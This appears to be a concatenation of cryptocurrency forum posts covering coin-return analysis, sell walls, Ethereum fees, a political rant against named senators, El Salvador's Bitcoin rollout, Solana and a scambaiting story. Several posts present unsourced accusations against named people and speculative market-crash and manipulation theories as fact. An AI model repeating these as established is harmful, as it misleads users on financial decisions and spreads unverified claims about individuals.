space.](https://preview.redd.it/ie9owd9mylv81.png?width=895&format=png&auto=webp&v=enabled&s=706c591e7d231facdee94ad62a74d3dd63a3057a)I have limited the analysis to the top 100 coins because of two reasons1. Even now, close to 95% of the combined market cap of the crypto market is contributed by just the top 100 coins. Adding to this, it becomes more and more difficult/riskier '[2'] to invest in coins having low market cap due to platform and liquidity issues.2. There are hundreds of new coins that are being launched every day. It's almost impossible to keep track of all the coins and realistically do proper due diligence before investing. So for practical feasibility, I am limiting it to the top 100.### ResultsBefore we jump straight into the return calculation, it's interesting to see how the crypto market has changed over the years.https://preview.redd.it/m0fng8moylv81.png?width=649&format=png&auto=webp&v=enabled&s=6ebef942f0bb3e570ec51568a223ebaa1c5c714fIn the first few years where crypto was becoming mainstream (2014 to 2017), the top 10 currencies dominated the overall market cap contributing close to 99% '[3']. Also, during crashes, we can observe a massive shift in capital allocation from Altcoin to Bitcoin ‚Üí 2017 was one of the best bull runs (barring 2021) where we can see that Bitcoin only contributed to '~39% of the market cap. But once the bear market set in (2018-19), the allocation to bitcoin proportionally increased until the 2021 bull run.#### Creating a Crypto IndexTo answer our initial question ‚Üí Whether it's better to invest in the top 10 most popular cryptos or the other 90 relatively lesser-known ones, we will be creating an equal-weighted index '[4'].We have two people Alan and Charlie who want to get into the crypto market in 2014, but both are following a slightly different approach.Alan will invest only in the top 10 most popular currencies. Every new year, he will go and check the top 10 cryptos by Market Cap and then equally invest between the top 10 cryptocurrencies. Charlie, on the other hand, will do the exact same thing with the only difference being that instead of the top 10, he will invest in the 90 next biggest cryptocurrencies.They continue to do this over the next 8 years and now it's 2022 and it's time to see who has performed better.[Returns shown here are till Jan 1st, 2022](https://preview.redd.it/5u10wctsylv81.png?width=628&format=png&auto=webp&v=enabled&s=ccd4df269ea3a81904e54ab5d06210039e50edf4)Would you look at that! Alan who has invested in only the top-10 cryptos did vastly better than Charlie who went for the riskier play of investing in the not so well known currencies. The top 10 cryptos on average performed 5x better than the next 90 and 2x better than just investing in Bitcoin. What's even more interesting is that Charlie would have done 2x better just putting his money in Bitcoin - Ouch!#### SurvivalIf you are wondering why Charlie is getting the lowest return in spite of taking the most risk'[5'], it's because you are forgetting Rule 1 of investing - To not lose your initial investment.https://preview.redd.it/mmntwr9vylv81.png?width=714&format=png&auto=webp&v=enabled&s=0dbb77cb2a0125748ac26c763d91adc35eefdcdeThe probability of survival of a coin is extremely skewed towards the top 10 currencies. As you can see, over 80% of the top 10 coins from 2014 are still in existence today compared to only 26% of the rest. This trend keeps repeating over the years and your capital would have been decimated. Once it goes to zero, there is no way for it to come back up as any gain on $0 is still 0!#### MoonshotsFinally, we come to what we are all here for! What are our chances of actually hitting a moonshot following this strategy?[I have defined a 100x return as a Moonshot](https://preview.redd.it/j8oiifewylv81.png?width=404&format=png&auto=webp&v=enabled&s=4f8fb526dc71aa2efca0c1fea03c5e983eff3ee8)Well, your chances of hitting a moonshot are also much higher following the top-10 strategy. Overall, you had a 1 in 10 chance of getting a 10,000% return compared to the 1 in 30 chance of the riskier next-90 strategy.The above chart also shows another interesting stat ‚Üí Out of the 500+ cryptos that we analyzed, less than 4% of them ended up becoming a moonshot. Think about that for a min - Of all the cryptos you are likely to hear about (*as there is very less coverage if it's not in the top 100*), only 3-4% of them end up giving you those insane returns. You have similar chances betting on a single number on the Roulette wheel.https://preview.redd.it/23hva9qyylv81.png?width=391&format=png&auto=webp&v=enabled&s=5af162b36f5bd910f11d4c6761bced864a22823dAs you can see, of all our moonshots, Ethereum investment in 2016 ended up returning the most at a whopping 397,548%!### LimitationsIt's important to understand the limitations of the current analysis before trying to replicate it.1. **Data** '- As I discussed earlier, all the data is from coinmarketcap and I have assumed a coin is dead if it's not listed in the following year's data. This analysis is only as strong as the quality of input data '[6']. I have done extensive QCs but feel free to play around with the raw data to see if I missed something.2. **Base Effect** '- The market is considerably different now than it was in 2015-17. There is more awareness as well as penetration. So the future growth might not be as explosive as the one that we observed in the past decade, so you should be realistic about your return potential3. **Intra Year Returns** '- The current analysis only considers returns based on Jan 1st of every year starting from 2014. If we pick another date within the year, we might get slightly different results as there might have been ATHs and ATLs within the year which we are not capturing.### Conclusion>*It's not whether you're right or wrong that's important, but how much money you make when you're right and how much you lose when you're wrong ‚Äî George Soros*I started the analysis thinking that investing in the not-so-popular currencies is bound to give better returns as it's more likely they are undervalued due to lower publicity and hype associated with them.But, as we saw from the data, in the case of crypto it's much more profitable just to invest in the top currencies. It's like the case where being in the game is much more important than trying to hit it big and striking out!***If you liked this post, you might like my other analysis on Crytpo:*** [How to consistently make returns from the Crypto market by using Dollar Cost Averaging](https://marketsentiment.substack.com/p/crypto-dca?s=w)&#x200B;**Data:** All the data used in the analysis [**can be found here**](https://rows.com/market-sentiment/my-spreadsheets/untitled-spreadsheet-3-7fuGkqeJVN8gkvISEezt43/live) *(it's a treasure-trove of information IMO as you can filter based on the rank, price, market cap - however you like it.

I was going to reply in a comment, but I feel that a lot of people can benefit from a short write-up on them.#What is a sell wall?A sell wall is a tool used by a rich individual,or group of rich individuals, to manipulate the price of a stock downwards. A large sell order is set at a specific price by the whale(s) to prevent higher sell orders from executing.A sell wall looks like this on the depth chart: http://brettwestbrook.com/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-12.58.10-PM.png###How does it work?This is best explained as an example.A wealthy person, we will call him Richard, tells a group of his wealthy friends that he wants to make money on a particular stock. This could be for a number of reasons such as:* The stock has a lot of room to grow* The stock can be easily manipulated* The stock has a lot of potential to get big in the near futureRichard and his friends decide that it's a good idea. They all want 1 million of X cryptocurrency. *Unfortunately, in the cryptocurrency market Richard and his friends can't execute all the buy orders at once or the prices will skyrocket!* To achieve 1 million obtained goal, they decide to set up a sell wall, and manipulate the price downwards. They do this in steps:1. They accumulate together. They will maybe get 250,000 of X crypto each. In their specific market, this didn't affect the price that much. Great! 2. They now set a specific price they feel is low enough for them to be able to reach their 1m X crypto goal. For this particular crypto they decide to all sell their obtained crypto at $2.40.3. Now, between Richard and the group, there is >1 million dollars worth of X crypto selling for @2.40 on the market, a seemingly undervalued price.There is SO much volume being sold now, buying pressure cannot eat through that wall in a reasonable time frame - it would take a very high buying pressure to do so. What also happens next is the key: nobody else can sell above that sell wall price until it's gone. The result? People need to sell lower than the sell wall in order to liquefy their stock. This drives the price downwards.Richard and his friends can now safey all get to their 1m X crypto mark without raising the price exponentially! When they decide to rid their sell walls the price moves up accordingly!##How can you use this to your advantage?A common thought is that the main goal of a sell wall is to instill fear into the weaker hands so that they sell by the thought that 'Oh no everyone is selling!!' While it's not the main purpose, it probably does happen a little bit. People get nervous when things a large volume of crypto is being sold.As Warren Buffet said: *Be Fearful When Others Are Greedy and Greedy When Others Are Fearful.*For a real life example:VECHAIN. For those that don't know, about a month ago vechain was sitting around 29 cents. They had a pretty large announcement that was, yes, front page of reddit. The price nearly doubled to 70 cents (it actually happened right before the announcement). What happened after? Some people bought the rumor and sold the news. But, this news was really big. Masternodes, rebranding, big partnerships. Ask any VEN holder why the price didn't continue to rise after that and they will probably know why - price manipulation with sell walls.Such as: https://i.redd.it/bjaubsgn04601.pngVECHAIN has had a lot of new partnerships, announcements, and generally great news to propel the crypto further, but has been held back by these sells walls constantly. Just recently buying pressure has been very high and the whales have been having trouble controlling it they way they would like.That's a real example of what has been happening. Take a look at roadmaps and see where different projects are at in development. Are any projects getting seemingly great news without moving in price?What about REQ? We saw a couple of front page posts about REQ moving to main net, quality pictures from the UI, etc etc. REQ was fairly stagnant around 30 cents before slingshotting to 80 cents in nearly a day. Sell walls and price manipulation.This field is speculative so any news drives buying pressure. Unfortunately, the very wealthy have a say as well. Look for great projects and determine if they solve a need. Look to see what's hitting the media's spot light, such as the front page here. **THEN take a look at the depth charts on the exchanges.** In crypto anything goes, and you better believe the very wealthy have difficult to obtain knowledge. When you see these obvious sell walls, you want to investigate and try to identify any trends. Perhaps you can look at **volume** of a cryptocurrency. A stagnant crypto with LOTS of volume is a huge indicator, sideways consolidation. Ripple did this for a few weeks, even months at certain stages. Once you find one that looks good - **you'll need to hold at the mercy of the whales.** Trust me, they want profit more than you do. The wait is almost always worth it because price will rise very rapidly once selling pressure is completely abolished.Hope this helps guys. P.s.

As soon as other countries heard of the Taliban rising, they closed all embassies so nobody could get a visa. It used to be easy to get out of the country to atleast Pakistan, India or China but they too closed their borders when the Taliban march became too 'real'. With no passports, no visums and no money for 90% of the Afghan people, where would they go?As more and more provinces were being taken, more and more people were forced to go to Kabul. Most of these fugitives had fought against the taliban in their own province and were now forced to sleep in the parks, on the ground and in the parkings lots. The locals of Kabul spared them whatever food they could.......When the Taliban circled Kabul, hyperinflation occured. Prices of all foods skyrocketed out of fear of dying of starvation.

Like the title says, I 'gave' each of my dogs $100 to invest in crypto and plan on giving them the rewards (probably in the form of special treats, food, toys) when they reach the appropriate age.For practical reasons I did not create accounts for them in an exchange, we will be using my account instead and I will be managing their funds for the time being. Just imagining how long the verification (kyc) process would take for them gave me a headache. Moreover, my dogs are still not very good using the keyboard or touchscreens, so it made more sense for me to do it.Even though I am technically managing the funds for them, they were actually the ones who decided which projects were worth investing in. In order to save time I decided it would be best to show them the logo of each crypto and read them the name, if they barked, that meant they wanted me to buy some. I decided to allocate their $100 in three equal parts among the first 3 projects they barked at. This way they would have a diverse portfolio.The results were the following:* Gandalf the Beagle (DOGE, CAKE, SHIBA)* Attila the Pug (DOGE, BAT, ADA)Like I said, the decision was theirs, I have to respect it. Gandalf was probably just hungry at the moment and thought I was offering him cake and the sight of a doge and shiba dogs made him happy. Attila probably chose doge for the same reason, and I guess he reacted at the word 'bat' because he hates bats. At first I was surprised when he chose ADA. I thought he had probably been reading up on the project and read about the smart contracts being implemented today. Now I just thing he though I said 'ADA BOYYY'.I will let you know how these investments turn out, remember it's important to think about your pets' financial future as well.&#x200B;EDIT: Wow thanks everyone I1m glad you were entertained, btw these are some of the funniest comments I have ever seen!",False,I gave each of my dogs $100 to invest in crypto.

I've seen a lot of posts here and in /r/ethereum talking about high fees. I've also seen a lot of extremely misleading statements here and there about how high fees are right now and will try and simplify things a bit. I'll do my best to remain impartial, and feel free to correct me and I'll edit my post. All plans are subject to change, the following is based on my current understanding and recollection of developer statements.>What is happening?* ETH fees are high right now. The best place to see gas costs (how much you'll need to pay for a transaction vs how quickly you want it) is here: https://ethgasstation.info/* Smart contracts and ERC-20 tokens consume much more gas than a basic transfer. While a typical transfer might be $3 a poorly written smart contract could consume $100 in gas. This variation leads to lots of confusion on various forums. An absolute metric crap ton of tokens run on ETH, so ETH being congested causes lots of downstream effects, tokens that consume lots of gas are disproportionately effected.>Why is this happening? * [Utilization is through the roof right now](https://txstreet.com/v/eth-btc). At post time ETH is achieving 16.14 TPS vs BTC's 4.00. Despite being 4 times faster the demand for on-chain (L1) transactions is overwhelming. At the bottom of [this page, make sure to scroll down](https://ethgasstation.info/index.php) you can see that blocks are at 100% right now. That means people are constantly outbidding each other to make it in. * At post time [Uniswap](https://ethgasstation.info/gasguzzlers.php) is the biggest gas guzzler. People are using Decentralized Exchanges (dex'es) a ton and its consuming a huge chunk of block space and people are paying a premium for it.>How can I save money? * ETH demand fluctuates heavily throughout the day, it's not uncommon for fees to drop 10x in an hour. If you are not in a hurry waiting a bit for a slow period and broadcasting a median gas transaction can save you a TON of money * Some wallets/apps are designed to be super user friendly, and unfortunately they hardcode the fastest possible gas costs for a good user experience (UX). Unfortunately that's a very bad idea when gas is high and only causes rates to climb even more. EIP-1559 will fix this, more on that later * Don't interact with smart contracts if you don't have to. It sucks, I know. But the fact is that using a smart contract is way more expensive than normal transactions. When gas is a fraction of a penny nobody cares, but its not right now and this is where we are. Last I checked, L1 [ETH](https://ycharts.com/indicators/ethereum_average_transaction_fee) transfers are still cheaper than [BTC](https://ycharts.com/indicators/bitcoin_average_transaction_fee). Not much of a consolation, but it's not a *total* disaster yet. EDIT: It appears the last 2 days ETH has flipped BTC on transaction costs. $17 USD still seems really really high, as of post-time a $5 transaction would go through within a few minutes)>What is being done about this? (sorted by est delivery date) * Berlin upgrade: Est 1-2 months, will adjust gas costs of various transactions for certain core operations. Should help fees overall on many contracts. * EIP-1559: Est 'this summer, but maybe Q3': A huge overhaul to the fee system. Block sizes are FLEXIBLE, targeting 50% full. When a block exceeds 50% full the base fee increases. When it drops below 50% the base fee decreases. Fees are burned (nice deflationary side effect). This means a few things: A) Spikes in transactions can make the next block instead of clogging the mem pool B) costs are MUCH more easy to calculate, and block include time estimation is much easier. C) The improved predictability/include time means shitty apps won't have a reason to set absurd fees for a good UX, driving 'gas inflation' like we see now. There's a lot more to EIP-1559, but that's the gist of how it should impact transactions * 2.0 Phase 0: Already live, but the beacon chain won't impact 1.0 until 'the merge'. Baseline TPS should be higher than 1.0, and its also environmentally friendly :) * 2.0 Phase 1: Est end of 2021, Sharding will first scale to 64 shards (eventually 1024) for a 64x scaling effect on the beacon chain.  * The Merge: Some call this Phase 1.5, but it is planned for 2022. This will move ETH 1.0 as a shard on to 2.0, and all finality will occur on the beacon chain. At this point ETH's core TPS should be 64-100x faster than what we have today * 2.0 Phase 2: Est end of 2022/2023, Execution Environments aka sharded smart contracts allow for smart contracts to share data across shards so that DeFi/Dex'es etc benefit from 2.0's massive scalability>What other out-of-order improvements are coming? * Various L2 technologies are already live, and several smart contracts are upgrading to them now. This will let you pay on L1 to 'get in', then perform a lot of cheap transactions on L2. Right now every trade on uniswap clogs L1. When it runs on L2 all those trades are off-chain and gas fees are only driven up by deposits/withdrawals. This should have a massive impact on overall gas costs. The good news is the insane fees on some contracts act as an INCENTIVE to get L2 up and running faster.I know a lot of people are unhappy with the current situation, but a lot of progress has been made and a lot of exciting progress is on the horizon!

These are the 6 Senators (listed in no particular order) who are responsible for the cryptocurrency disaster in the Infrastructure Bill. We will remember their actions and vote them out!**Rob Portman (R-OH)** ‚Äì drafted the disastrous, original cryptocurrency provision. When Toomey, Wyden, and Lummis introduced an amendment to fix the provision, Rob Portman publicly supported their amendment before blindsiding everyone with his own, worse amendment. Portman has proved himself to be a puppet for Janet Yellen and Wall Street.**Mark Warner (D-VA)** ‚Äì wrote the worse crypto amendment with Rob Portman, creating chaos in the Senate and causing Portman to recant his previous support of the Toomey/Wyden/Lummis amendment. Because the Toomey/Wyden/Lummis was bipartisan and already widely expected to pass, Mark Warner's co-authorship of the Portman amendment gave the Portman/Warner/Sinema amendment bipartisan sponsorship, giving it legitimacy to contend the Toomey/Wyden/Lummis amendment.**Kyrsten Sinema (D-AZ)** ‚Äì did not write the worse crypto amendment with Portman and Warner, but signed onto the amendment later to give it legitimacy. Kyrsten Sinema was one of the two leaders of the Senate Infrastructure Bill negotiations, along with Rob Portman. Once Sinema signed onto the Portman/Warner amendment, it became extremely difficult for other senators to publicly oppose the Portman/Warner/Sinema amendment, because it became a symbolic rejection of the Infrastructure Bill as a whole. This is why we only saw Republicans who already indicated they would vote against the Infrastructure Bill publicly commit to the better, Toomey/Wyden/Lummis amendment.**Bill Hagerty (R-TN)** ‚Äì 99 out of 100 Senators voted to expedite the Infrastructure Bill, which would have led to an opportunity for proper consideration, debate, and voting on the cryptocurrency amendments. Bill Hagerty was the ONLY Senator to vote against expedition. This forced the Senate to either take a vote to end debate and force a vote on the *whole* Infrastructure Bill within 30 hours, or to take a recess until September 13, 2021. Once the Senate voted to end debate, it meant that the cryptocurrency amendments would not even be voted on without unanimous consent of all 100 Senators. Hagerty effectively increased the number of Senators who needed to support a crypto amendment from 60 to 100.**Richard Shelby (R-AL)** ‚Äì 99 out of 100 Senators consented to vote on the mega-compromise Toomey/Lummis/Warner/Portman/Sinema amendment which was substantially similar to the good Toomey/Wyden/Lummis amendment. It was widely expected to pass, and we would have seen a resounding success. However, Richard Shelby was the ONLY Senator to refuse to consent, because he conditioned his consent on the Senate also approving $50 billion in military spending. When this idiotic ultimatum was rejected, Richard Shelby objected to the cryptocurrency amendment, leaving Portman's disastrous, original cryptocurrency provision intact.**John Thune (R-SD)** ‚Äì the Senate Minority Whip. His ONE job is to make sure that the Republican senators vote with party leadership. He failed this TWICE by allowing Bill Hagerty and Richard Shelby to block the crypto amendments. How hard could it be to get corrupt politicians to vote with a corrupt party? Just promise to give the Republicans candy if they vote with the party. I used that strategy to win my middle school student government election in a landslide.Also, fuck **Janet Yellen**. The unelected, 74-year-old Secretary of the Treasury was the person behind the cryptocurrency provision in the first place, as well as the Portman/Warner/Sinema amendment. It's no surprise that the woman who took $7.2 million in speaking fees over the last two years (almost entirely from banks) was behind this attempt, at every step of the way, to systematically destroy cryptocurrency and DeFi.

Let's buy it, even if it's at ATH! One of our product doesn't work anymore because we rushed a bug-fixing patch?

This kind of stuff is what gives crypto it's bad reputation to the outside world, and I deeply regret having been a part of this for a short time.And finally, and I think this is the most important part : **the founders didn't care about the crypto ecosystem at all**. Their main objective was making as much money as quickly as possible. We were acting like an evil hedge fund, precisely the type of institution crypto is supposed to fight. I felt sad.

Same with Polygon. 1 dapp putting whole network on stop is really not what people would expect of the so called 'next gen eth competitors.'While I 100% agree that gas fees on Ethereum are absurd, I wonder if the alternatives that we have at the moment in top10 are going to solve that. All claim insane TPS and finality times, but when the shit gets real, the fees and network congestion go up to the sky.",False,"Cardano network clogged, Avalanche congested a while ago, Polygon almost stopped completely due to some flower picking game.

This event was an invite-only occasion for media and partners with a live stream to YouTube. During the event, Sunny Lu and Luca Crisciotti of DNV GL talked about the past, present, and future of VeChain. Sunny clarified that VeChain's uniqueness is not only technical but also its understanding of ecosystems. He pointed to the governance and economic models as examples. This sentiment was echoed by Luca as he assured everyone that after meeting with countless blockchain solution representatives he chose VeChain as the partner for DNV GL because of their understanding and dedication to the customer. This mindset has lead to over 180 opportunities for VeChain in 2018. Many of these opportunities are left unannounced, but in the course of the event, VeChain announced several new partners and opportunities including the University of Oxford Mathematical Institute, Carbon Bank solutions, BitOcean ICO, food sourcing, and BMW Group. Also in this event, Sunny Lu showcased three decentralized applications (DApps) that are being built to cater towards the mainnet launch. Those DApps include:* VeVID -  KYC and digital ID maintenance solution that can be native to all VeChain applications or partners. [You can read the official announcement here.](https://medium.com/@vechainofficial/vechains-first-official-public-infrastructural-decentralized-application-vevid-cd97bdf98670) * VeVOT - A voting service that will be initially used by the VeChain governance model. This solution will be available for other general voting events to be logged on the blockchain such as government voting and board votes. Voting results will be audited by independent partners and certified on the blockchain. * VeSCC - Smart contracts on the VeChainThor mainnet can be categorized into certified and uncertified, which can be checked in the explorer. The certification of smart contracts covers various aspects including the identity of the owner, the legality of the purpose, and the security of the source code. At the event, the carbon bank solution was made public to raise awareness that VeChain is building solutions alongside DNV GL that will monitor, analyze, and reduce the carbon footprint. This solution is being used and researched by universities (Tsinghua University), businesses, and government bodies.In this event Sunny Lu took the time to introduce the University of Oxford (Mathematical Institute) as a partner in the VeChain ecosystem and will be working on assuring the economic model is working as intended for VET holders, VeThor users, and new customers. It was also mentioned that Japanese FSA certified partner BitOcean would be the first ICO on VeChainThor.Luca Crisciotti left with words of encouragement of VeChain We are not talking about pilot projects, we are talking about solutions that are working for real cases. Luca went on to say:DNV GL is a company with over 150 years of history. And unfortunately, this is something we can not share, because you [VeChain] were only born a few months ago. But we do have something in common, and it's a bright future. So thank you Sunny for the partnership and this amazing event.

I understand that my previous posts looked like complete FUD, but that's not my intention. I wanted to share how all of this affected Salvadorans, specially for those who barely have money to get a 'decent' mobile device.Adoption is going pretty bad, specially because of identity theft. There have been hundreds of reports about people using the Chivo Wallet to steal money. The government is being quiet about it, and no one is offering a solution to the problem:>https://diario.elmundo.sv/denuncian-robo-de-datos-personales-para-uso-no-autorizado-de-chequera-chivo/That is not a case of phishing or people authorizing full access to the Chivo Wallet, this is way worst. The Chivo Wallet 'has facial recognition', or so they said however it is just storing a picture, any picture. There is no validation whatsoever, and because of that people are no longer using/trusting Bitcoin:>https://imgur.com/a/7vRTft8And yes, I know you are going to say that this does not have anything to do with Bitcoin, but you gotta understand the Salvadoran culture: Once something fails, everything associated to it becomes bad. It doesn't make sense, I know, but that's how things really are here, and it is affecting adoption.Businesses are reporting low adoption. 93.1% of small/medium business are reporting ZERO Cryptocurrency transactions. The free bitcoin bonus was either converted to FIAT or spent in groceries, after that usage crashed.What about the protests? Did people finally accept the Bitcoin Law passed by the Salvadoran congress?Not quite.There were two protests:- September 15th- September 30thBoth protests were massive, huge turnout.

Are they afraid of changes? Why they don't want free money?Well, salvadorans are protesting because this whole Bitcoin Law thing has been shady. First of all, remember the 'Not your keys, not your money' thing that you see pretty often here? We don't know where the 700 bitcoins that the President Bukele bought are. Who is our broker? How much did we pay for those bitcoins? What about the free 30 dollar bonus? How much did it cost? All information regarding the purchase of Bitcoin is classified. What about the ATMs? We only know that a known Bitcoin ATM company provided them, but the cost of those 200 ATMs is classified information because of 'National Security' (whatever that is). But hey! El Salvador is mining Bitcoin with vulcanoes! Yeaaaaaaaaah, about that.... It is true, but it is not a new well, nor new infraestructure. The mining farm is located in a poor town called Berlin, Usulutan. LaGeo is the name of the state-owned company that produces geothermal electricity for the Oriental Region (Usulutan and San Miguel), however due to the mining farm, we are starting to burn more coal to provide enough energy to the region. Electricity costs are rising up, but our President puts profits over people.Profits over people you say? Covid cases/cases are going up, but Bukele is not restricting movement because that would be a fatal blow to the Chivo Wallet adoption. You see, if people cant go outside they cant go to the Chivo Offices to set up the wallet and learn how to use it. Bukele cares more about profits, and spends his days tweeting about bitcoin prices (Trump would be so proud):>http://imgur.com/gallery/ma4IgAYWhat is next?

They dont want their baby to die just yet. Apparently Jump Capital owns a significant stake in Wormhole and is ready to sink such a huge amount to cover losses. In Solana, the top 1.34% of addresses owns 99% of the circulating supply. Most of the supply was sold to early VCs and insiders at a massive discount to retail. Insiders and bad actors like Chamath have publicly joked about using Solana as a vehicle to play their pumps and dumps out, leaving retail to hold the bags when the sham unfolds. VCs dont just sink in $300m to save the day, unless they have already taken out 50x that amount - that is what Solana has enabled them to do already.So a buncha SOL Shills be like hurr durr even ehtirium had hacks and was saved by fork. Well the DAO hack was solved by cryptography solutions (forking), not by VCs stepping into save the day. If you think both are the same, you clearly understand NOTHING about crypto whatsoever. The DAO hack and the hard fork took over a month to assess, propose solutions and resolve. It wasnt an overnight fix, like what solana is known for. When Solana goes down - over night fix.When bridge hacked? - overnight fix. How long will Solana depend on overnight fixes to bail the network out?Edit: The mental gymnastics of SOlshills is just incredible. They have clearly consumed all the kool aid in the world to be supportive of this kind of institution manipulation. Yes, other projects also have VCs, and Eth projects have also been hacked. Yet none of the ETH projects have been bailed out in this manner by VCs and institutions. I have been extremely critical of ETH too. There is virtually a hack a day on Eth due to poor code or implementation or bugs, but none of the ETH project hacks have been 'replenished' by institutions. If an ETH projects gets hacked and people lose money, well you are shit out of luck. As evidenced by hundreds of hacks and scams before. The first major Solana hack, and less than 24 hours later the institutions propping up solana claim they are bailing everyone out. If this is not the least bit suspicious to you, then you are just being slow boiled alive. Solana itself is a long term pump and dump that is devoid of any decentralisation and fundamentals except a bunch of whales propping it up. The tokenomics of every single Solana 'ecosystem' project is puke worthy - from Serum to Raydium, Bonfida, Saber etc all have massive supply in the hands of a few, an incredibly high FDV and a low float and funny unlock mechanisms - perfect conditions for institutions to keep dumping on hapless retail investors like the ones supporting Solana in the comments here who dont understand anything about crypto or finance.",False,"The $320m Wormhole hack was 'replenished' by Jump Capital, an institutional trading desk/market maker (similar to Citadel) without any questions.

But the thing is, I hadn't received any of those DMs so far, and I was looking forward to, because I was once a scambaiter and I missed the good old days.Well, this 'crypto trader' contacted me out of the blue three weeks ago, and I happened to have some free time in my hands. He stole the pictures of some real guy who works with blockchain technologies. He really wanted to talk about crypto, but I tried to deviate from this topic and tried to flirt with him instead. I provided some fake info about myself, and acted like I was very lonely and very happy to finally talk to someone. I wanted to waste his time, but he kept asking about crypto.Day by day, I tried to gain his trust. I acted very naive and grateful for his advice. I even told him someone had DM'ed me to discuss crypto, and that I suspected it could be a scam. He instructed me to block those people as soon as possible. One day, I asked to do a voice call, but he couldn't because apparently that would disrupt his crypto signals, whatever that means. He claimed to be from the US, which I'm sure he wasn't, judging by the way he expressed himself.He wanted my crypto asap. He was going to trade it for free because he loves me so much. I told him I was going to receive an inheritance in crypto, but that my attorney was the one managing it. I asked whether I should tell the attorney about our 'relationship' and how he was going to trade for me. He ordered me not to tell anyone about 'us'. Unfortunately for the scammer, the 'attorney' would be back around the second week of September. This bought me some extra time to keep wasting his.I never thought I would end up pulling this off, but what I did has all the characteristics of an advance-fee scam:1. The 'attorney', who was the custodian of my crypto inheritance, told me he was holding 2.74 BTC on my behalf.2. I went to see the attorney and signed some documents, where I gave him permission to transfer all my crypto to the scammer. I gave scammer a made-up case id and asked him to contact the attorney.3. Scammer contacted the attorney but didn't provide the id. This delayed things (also because I was busy in real life). Id was requested again.4. Scammer provided the id and his address for the transfer to take place.5. Attoney informed scammer that, to avoid scams, and to pay for administration costs, he would have to transfer 0.05% fee in advance (0.00137 BTC).6. I woke up to a formerly empty wallet that now contains the 0.00137 BTC, I couldn't believe it!

I might hold it for a few months and then donate it to the food bank or something, I don't know.

Some of this will be talking about the world  outside of cryptos - specifically other markets, equities, and a bigger picture. If that's not allowed on this subreddit, totally understood, but I thought I'd bring an outsiders perspective to this, since I am utterly unsurprised by the events of the day and have been expecting this (or something like it) for some time. This is not meant as financial advice. Do your own research. Make your  own decisions. If you think I'm right, great! Act on it. If you think  I'm wrong, great! Act on it. Do your own thing. I'm just some guy on the internet, and my opinions are about as valuable as a guy spinning a sign on a street corner.Finally, this is not intended as a FUD post - if you come to  the same conclusions I have, there will certainly be fear involved, but hopefully no uncertainty or doubt, and you can make decisions that lead to healthy financial outcomes for yourselves and loved ones. I'd  like to post a TLDR that everything is going to be okay at the end, but I  don't necessarily think that's going to be the case. I think scary and volatile times lay in our immediate future. I have no crystal ball, and whether that's tomorrow or 3 months from now I don't know, but I think we're facing choppy seas. I believe we're about to see a major market correction, and the volatility in cryptocurrencies is just the beginning. I believe this will hit every sector of the economy, from housing prices to the value of the USD. I believe cryptocurrencies in particular will see extreme volatility, both in a downward trajectory and later, an upward trajectory. Here are some core premises this speculation will be based on. 1. Cryptocurrencies have not yet found a price equilibrium that reflects  their ultimate value. Currently, they are a speculative asset.2. Despite not having to file their positions on their 13F forms, hedge  funds and investment banks are very much involved in cryptos.3. Cryptos are a relatively unregulated market, which makes pump and dumps a much easier prospect. 4. In their current form, cryptos have not achieved any real detachment  from the US dollar. Meaning, that when the market goes up, cryptos go  up, and when the market goes down, so do cryptos. Their promise of  breaking from the USD an becoming an intrinsically stable currency appears to not have matured  for the moment. Here are some ancillary premises. 1. In order to shore up the economy during covid, the government did a  few things: it started loaning money at 0% interest like crazy, and it  reduced collateral requirements to increase liquidity in the  marketplace.2. Collateral is heavily rehypothicated right now. An example of this  goes as follows: company A has a 20 year treasury bond. It's keeping it  on its books as collateral to meet its margin requirements so that a lender will give it money to invest on margin. Company A then proceeds to lend  that treasury bond to company B. Company A keeps it on its books though, because  they can recall it as collateral any time they need to in order to meet their own collateral requirements. B now goes to  a lender and says hey, I have this treasury bond as collateral,  will you lend me some money? This process is repeated several times, until you eventually have an absolutely massive amount of margin being lent out on a single treasury bond serving as collateral. Go take a peak at the repo market. People are literally paying borrow US Treasuries to hold as collateral because collateral has been so overleveraged. 3. During Covid, the economy has suffered. unemployment is up, supply chains have been stressed, companies have been going out of business, and savings have actually gone up for the lucky people who have been able to hang on to their jobs, and they're not out spending money. This has lead to an abnormal situation in which the stock market, which is typically (at least loosely) tied to the economy and goes up or down in tandem with the economy as a whole disconnecting - meaning that while the economy is doing poorly, the stock market has boomed to a new ATH at an unprecedented rate. 4. Margin debt in the financial markets has seen an enormous spike in the last year. The market as a whole is extremely leveraged - which means that small events can have enormous impacts, and wider market implications. And finally, here are some more speculative premises. These concern what I believe is, and will be the catalyst, and the hope for crypto in the future, but they're not essential for the argument that the market correction is imminent.  1. Naked short selling is an enormous problem facing the US financial markets. To understand why, it's important to understand the difference between short selling (locating and borrowing a share, selling it, and promising to buy it back later on the hopes of a lower price), and naked short selling (creating a synthetic share that was never issued by the original company and selling it). 2. Naked short selling has long seen lax oversight by the regulatory agencies. Through a series of revolving doors and allowing the markets to run their own regulatory agencies, this enormously profitable business gets a blind eye from the regulators tasked with stopping it, because those same regulators are ultimately also the ones who profit from it when they move back into the private industry. 3. Naked short selling is the financial equivalent of creating a counterfeit share, selling it for profit at the cost to the shareholders and company, and having 0 intention of paying it back. This tanks company value, and effectively steals value from actual shareholders. It has been used for decades to drive companies out of business. Occasionally, you get a company like Overstock that beats the odds and sees a short squeeze followed by a share price resurgence, but it frequently results in a company going out of business. 4. Naked short selling can be hidden in a variety of ways. While people frequently turn to the short interest as a way to examine how shorted a company is, there are a variety of methods that market makers can employ using options chains to create FTD's (shares that are a failure to deliver because they never had them in the first place, and never intended to find) and then recycling those FTD's ad-infinitum until the targeted company goes bust.  5. When Covid hit, several hedge funds, banks, and market makers decided which companies they were going to short into oblivion, and profit off of their demise. They picked companies that would in theory be particularly hard hit by a reduction in customers that were used to entering a physical location.  6. For many companies, those efforts failed. The companies did not go out of business, and these Hedge funds and market makers find themselves in a position where they cannot close their positions, they are losing money every day. The two most well known companies in this position are AMC and GME. 7. Shorting a company exposes the short position to infinite loss. 8. There has never been a perfect storm of a short squeeze as GME. AMC may squeeze to a lesser extent - but it has no where near the amount of shorts that GME does. 9. There are a variety of catalysts that can cause GME and AMC to squeeze. Contrary to common opinion, the surge in share price in January and February was due to what's called a gamma squeeze, not a short squeeze, and the shorts have not covered.   Which brings us up to today. I believe that multiple hedge funds and market makers are in very deep on their short positions, and that they are fighting on a day by day basis at this point to stay solvent. I believe that if the US financial market is the overloaded and unstable Jenga tower, these companies are the live hand grenade placed on 